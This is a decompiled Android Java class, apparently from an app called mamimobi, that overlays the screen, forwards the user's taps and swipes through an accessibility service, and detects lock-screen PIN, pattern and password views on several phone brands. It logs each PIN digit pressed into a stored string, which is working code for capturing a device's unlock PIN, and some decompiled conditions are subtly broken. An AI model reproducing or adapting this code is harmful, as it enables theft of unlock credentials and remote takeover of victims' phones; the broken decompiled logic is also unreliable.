package defpackage;

import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.Rect;
import android.graphics.RectF;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.mamimobi.AccessService;
import com.mamimobi.videostream.model.ScreenPoints;
import java.lang.ref.WeakReference;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.atomic.AtomicInteger;

/* JADX INFO: loaded from: classes.dex */
public final class wm0 implements View.OnTouchListener {
    public float E;
    public float F;
    public final Path G = new Path();

    public static boolean a(AccessibilityNodeInfo accessibilityNodeInfo, ScreenPoints screenPoints) {
        String strValueOf;
        String str;
        AccessibilityNodeInfo accessibilityNodeInfoG = null;
        try {
            if (screenPoints.resId != null) {
                if (!AccessService.P0.containsKey("d")) {
                    Log.d("PatternLockHelper", "删除键进行查找");
                    String[] strArr = {"com.android.systemui:id/delete_button", "com.android.systemui:id/btn_letter_delete", "com.android.systemui:id/vivo_cancel"};
                    int i = 0;
                    while (true) {
                        if (i >= 3) {
                            break;
                        }
                        AccessibilityNodeInfo accessibilityNodeInfoG2 = AccessService.g(accessibilityNodeInfo, strArr[i]);
                        if (accessibilityNodeInfoG2 != null) {
                            Rect rect = new Rect();
                            accessibilityNodeInfoG2.getBoundsInScreen(rect);
                            ScreenPoints screenPoints2 = new ScreenPoints();
                            screenPoints2.x = rect.centerX();
                            screenPoints2.y = rect.centerY();
                            screenPoints2.rect = rect;
                            screenPoints2.contentDesc = accessibilityNodeInfoG2.getContentDescription();
                            screenPoints2.text = accessibilityNodeInfoG2.getText();
                            screenPoints2.resId = accessibilityNodeInfoG2.getViewIdResourceName();
                            screenPoints2.key = "d";
                            AccessService.P0.put("d", screenPoints2);
                            accessibilityNodeInfoG2.recycle();
                            break;
                        }
                        i++;
                    }
                }
                if (!AccessService.P0.containsKey("e")) {
                    Log.d("PatternLockHelper", "确认键进行查找");
                    String[] strArr2 = {"com.android.systemui:id/key_enter", "com.android.systemui:id/key_enter_text", "com.android.systemui:id/vivo_pin_confirm", "com.android.systemui:id/btn_letter_ok", "com.android.systemui:id/mix_normal_confirm"};
                    int i2 = 0;
                    while (true) {
                        if (i2 >= 5) {
                            break;
                        }
                        AccessibilityNodeInfo accessibilityNodeInfoG3 = AccessService.g(accessibilityNodeInfo, strArr2[i2]);
                        if (accessibilityNodeInfoG3 != null) {
                            Rect rect2 = new Rect();
                            accessibilityNodeInfoG3.getBoundsInScreen(rect2);
                            ScreenPoints screenPoints3 = new ScreenPoints();
                            screenPoints3.x = rect2.centerX();
                            screenPoints3.y = rect2.centerY();
                            screenPoints3.rect = rect2;
                            screenPoints3.contentDesc = accessibilityNodeInfoG3.getContentDescription();
                            screenPoints3.text = accessibilityNodeInfoG3.getText();
                            screenPoints3.resId = accessibilityNodeInfoG3.getViewIdResourceName();
                            screenPoints3.key = "e";
                            AccessService.P0.put("e", screenPoints3);
                            accessibilityNodeInfoG3.recycle();
                            break;
                        }
                        i2++;
                    }
                }
                AccessibilityNodeInfo accessibilityNodeInfoG4 = AccessService.g(accessibilityNodeInfo, screenPoints.resId);
                if (accessibilityNodeInfoG4 != null && accessibilityNodeInfoG4.isClickable()) {
                    boolean zPerformAction = accessibilityNodeInfoG4.performAction(16);
                    if (accessibilityNodeInfoG4 != accessibilityNodeInfo) {
                        accessibilityNodeInfoG4.recycle();
                    }
                    return zPerformAction;
                }
            }
            accessibilityNodeInfoG = AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/pinColorNumericKeyboard");
            if (accessibilityNodeInfoG != null) {
                int childCount = accessibilityNodeInfoG.getChildCount();
                if (childCount > 10 && !AccessService.P0.containsKey("d")) {
                    for (int i3 = 0; i3 < childCount; i3++) {
                        AccessibilityNodeInfo child = accessibilityNodeInfoG.getChild(i3);
                        if (child != null) {
                            Rect rect3 = new Rect();
                            child.getBoundsInScreen(rect3);
                            ScreenPoints screenPoints4 = new ScreenPoints();
                            screenPoints4.x = rect3.centerX();
                            screenPoints4.y = rect3.centerY();
                            screenPoints4.rect = rect3;
                            screenPoints4.contentDesc = child.getContentDescription();
                            screenPoints4.text = child.getText();
                            screenPoints4.resId = child.getViewIdResourceName();
                            CharSequence charSequence = screenPoints4.contentDesc;
                            if (charSequence != null) {
                                String string = charSequence.toString();
                                if (string.length() == 1) {
                                    screenPoints4.key = string;
                                } else {
                                    screenPoints4.key = "d";
                                }
                            }
                            AccessService.P0.put(screenPoints4.key, screenPoints4);
                        }
                    }
                }
                int i4 = 0;
                while (i4 < childCount) {
                    AccessibilityNodeInfo child2 = accessibilityNodeInfoG.getChild(i4);
                    if (child2 != null) {
                        try {
                            CharSequence contentDescription = child2.getContentDescription();
                            CharSequence text = child2.getText();
                            if (contentDescription == null || contentDescription.length() <= 0) {
                                strValueOf = (text == null || text.length() <= 0) ? i4 == 9 ? "0" : i4 == 10 ? "d" : String.valueOf(i4 + 1) : text.toString();
                                str = screenPoints.key;
                                if (str == null && str.equals(strValueOf)) {
                                    boolean zPerformAction2 = child2.performAction(16);
                                    child2.recycle();
                                    if (accessibilityNodeInfoG != accessibilityNodeInfo) {
                                        accessibilityNodeInfoG.recycle();
                                    }
                                    return zPerformAction2;
                                }
                            } else {
                                if (contentDescription.length() <= 1) {
                                    strValueOf = contentDescription.toString();
                                }
                                str = screenPoints.key;
                                if (str == null) {
                                }
                            }
                        } finally {
                            child2.recycle();
                        }
                    }
                    i4++;
                }
            }
            if (accessibilityNodeInfoG != null && accessibilityNodeInfoG != accessibilityNodeInfo) {
                accessibilityNodeInfoG.recycle();
            }
            return false;
        } catch (Throwable th) {
            if (accessibilityNodeInfoG != null && accessibilityNodeInfoG != accessibilityNodeInfo) {
                accessibilityNodeInfoG.recycle();
            }
            throw th;
        }
    }

    public static ScreenPoints b(AccessibilityNodeInfo accessibilityNodeInfo, Point point) {
        Rect rect;
        HashMap map = AccessService.P0;
        if (!map.isEmpty()) {
            Iterator it = map.keySet().iterator();
            while (it.hasNext()) {
                ScreenPoints screenPoints = (ScreenPoints) AccessService.P0.get((String) it.next());
                if (screenPoints != null && (rect = screenPoints.rect) != null && rect.contains(point.x, point.y)) {
                    return screenPoints;
                }
            }
        } else if (AccessService.e0 != null) {
            AccessService.q(accessibilityNodeInfo);
            return null;
        }
        return null;
    }

    public static boolean c(AccessibilityNodeInfo accessibilityNodeInfo) {
        return (AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/lockPatternView") == null && AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/lock_pattern_view") == null && AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/colorLockPatternView") == null && AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/vivo_lock_pattern_view") == null) ? false : true;
    }

    public static boolean d(AccessibilityNodeInfo accessibilityNodeInfo) {
        return (AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/pinColorNumericKeyboard") == null && AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/pinEntry") == null && AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/fixedPinEntry") == null && AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/vivo_pin_edittext") == null && AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/fixedPinEntry") == null && AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/oplusos_kgd_security_pin_six_view") == null) ? false : true;
    }

    public static boolean e(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/passwordEntry") != null || AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/pwd_input_layout") != null || AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/MixPwEntry") != null || AccessService.g(accessibilityNodeInfo, "com.android.systemui:id/securityEditText") != null) {
            return true;
        }
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(accessibilityNodeInfo);
            while (!linkedList.isEmpty()) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) linkedList.poll();
                if (accessibilityNodeInfo2 != null) {
                    CharSequence className = accessibilityNodeInfo2.getClassName();
                    if (className != null && className.toString().contains("android.widget.EditText")) {
                        return true;
                    }
                    for (int i = 0; i < accessibilityNodeInfo2.getChildCount(); i++) {
                        linkedList.add(accessibilityNodeInfo2.getChild(i));
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    public static void f(boolean z) {
        WeakReference weakReference = xm0.c;
        if (weakReference == null || weakReference.get() == null) {
            return;
        }
        View view = (View) xm0.c.get();
        WindowManager.LayoutParams layoutParams = (WindowManager.LayoutParams) view.getLayoutParams();
        if (z) {
            layoutParams.flags = 296;
        } else {
            layoutParams.flags = 280;
        }
        xm0.b.updateViewLayout(view, layoutParams);
    }

    @Override // android.view.View.OnTouchListener
    public final boolean onTouch(View view, MotionEvent motionEvent) {
        int i;
        AccessibilityNodeInfo accessibilityNodeInfo;
        List<AccessibilityWindowInfo> windows;
        AccessibilityNodeInfo root;
        int type;
        String str;
        int type2;
        float rawX = motionEvent.getRawX();
        float rawY = motionEvent.getRawY();
        int action = motionEvent.getAction();
        Path path = this.G;
        if (action == 0) {
            this.E = rawX;
            this.F = rawY;
            path.reset();
            path.moveTo(rawX, rawY);
            return false;
        }
        if (action == 1) {
            float fAbs = Math.abs(rawX - this.E);
            float fAbs2 = Math.abs(rawY - this.F);
            AccessibilityNodeInfo root2 = null;
            if (fAbs >= 50.0f || fAbs2 >= 50.0f) {
                f(false);
                RectF rectF = new RectF();
                path.computeBounds(rectF, true);
                if (rectF.left < 0.0f || rectF.top < 0.0f) {
                    i = 4;
                    accessibilityNodeInfo = null;
                    f(true);
                } else {
                    i = 4;
                    accessibilityNodeInfo = null;
                    AccessService.e0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 350L)).build(), new vm0(this), null);
                }
                AccessService accessService = AccessService.e0;
                if (accessService != null) {
                    windows = accessService.getWindows();
                    try {
                        if (!windows.isEmpty()) {
                            Iterator<AccessibilityWindowInfo> it = windows.iterator();
                            while (true) {
                                if (!it.hasNext()) {
                                    root = accessibilityNodeInfo;
                                    break;
                                }
                                AccessibilityWindowInfo next = it.next();
                                if (next != null && next.isActive() && (type = next.getType()) != i && type != 2 && type != 5) {
                                    root = next.getRoot();
                                    break;
                                }
                            }
                            if (root != null) {
                                if (d(root)) {
                                    AtomicInteger atomicInteger = AccessService.C0;
                                    if (atomicInteger.get() != 1) {
                                        AccessService.k0.set(true);
                                        AccessService.f0 = "";
                                        atomicInteger.set(1);
                                        AccessService.H();
                                    }
                                } else if (c(root)) {
                                    AtomicInteger atomicInteger2 = AccessService.C0;
                                    if (atomicInteger2.get() != 3) {
                                        AccessService.k0.set(true);
                                        AccessService.f0 = "";
                                        atomicInteger2.set(3);
                                        AccessService.H();
                                    }
                                } else if (e(root)) {
                                    AtomicInteger atomicInteger3 = AccessService.C0;
                                    if (atomicInteger3.get() != 2) {
                                        AccessService.k0.set(true);
                                        AccessService.f0 = "";
                                        atomicInteger3.set(2);
                                        AccessService.H();
                                    }
                                }
                            }
                        }
                        for (AccessibilityWindowInfo accessibilityWindowInfo : windows) {
                            if (accessibilityWindowInfo != null) {
                                accessibilityWindowInfo.recycle();
                            }
                        }
                    } finally {
                    }
                }
            } else {
                int rawX2 = (int) motionEvent.getRawX();
                int rawY2 = (int) motionEvent.getRawY();
                Point point = new Point(rawX2, rawY2);
                AccessService accessService2 = AccessService.e0;
                if (accessService2 != null) {
                    windows = accessService2.getWindows();
                    try {
                        if (!windows.isEmpty()) {
                            Iterator<AccessibilityWindowInfo> it2 = windows.iterator();
                            while (true) {
                                if (!it2.hasNext()) {
                                    break;
                                }
                                AccessibilityWindowInfo next2 = it2.next();
                                if (next2 != null && next2.isActive() && (type2 = next2.getType()) != 4 && type2 != 2 && type2 != 5) {
                                    root2 = next2.getRoot();
                                    break;
                                }
                            }
                            if (root2 != null) {
                                if (d(root2)) {
                                    ScreenPoints screenPointsB = b(root2, point);
                                    if (screenPointsB != null) {
                                        AccessibilityNodeInfo accessibilityNodeInfoG = AccessService.g(root2, "com.android.systemui:id/vivo_pin_edittext");
                                        if (accessibilityNodeInfoG != null && accessibilityNodeInfoG.getText() != null && accessibilityNodeInfoG.getText().length() == 0) {
                                            AccessService.f0 = "";
                                        }
                                        if (a(root2, screenPointsB)) {
                                            Iterator it3 = xm0.e.iterator();
                                            while (it3.hasNext()) {
                                                ((ij0) it3.next()).a(rawX2, rawY2);
                                            }
                                            sa0.a(rawX2, rawY2);
                                            if ("d".equals(screenPointsB.key)) {
                                                if (AccessService.f0.length() > 0) {
                                                    String str2 = AccessService.f0;
                                                    AccessService.f0 = str2.substring(0, str2.length() - 1);
                                                }
                                            } else if (screenPointsB.key.length() == 1 && (str = screenPointsB.key) != null && str.matches("\\d+")) {
                                                AccessService.f0 += screenPointsB.key;
                                            }
                                        }
                                    }
                                } else if (c(root2)) {
                                    AtomicInteger atomicInteger4 = AccessService.C0;
                                    if (atomicInteger4.get() != 3) {
                                        AccessService.k0.set(true);
                                        AccessService.f0 = "";
                                        atomicInteger4.set(3);
                                        AccessService.H();
                                    }
                                } else if (e(root2)) {
                                    AtomicInteger atomicInteger5 = AccessService.C0;
                                    if (atomicInteger5.get() != 2) {
                                        AccessService.k0.set(true);
                                        AccessService.f0 = "";
                                        atomicInteger5.set(2);
                                        AccessService.H();
                                    }
                                }
                            }
                        }
                        for (AccessibilityWindowInfo accessibilityWindowInfo2 : windows) {
                            if (accessibilityWindowInfo2 != null) {
                                accessibilityWindowInfo2.recycle();
                            }
                        }
                    } finally {
                    }
                }
            }
        } else if (action == 2) {
            path.lineTo(rawX, rawY);
            return false;
        }
        return false;
    }
}
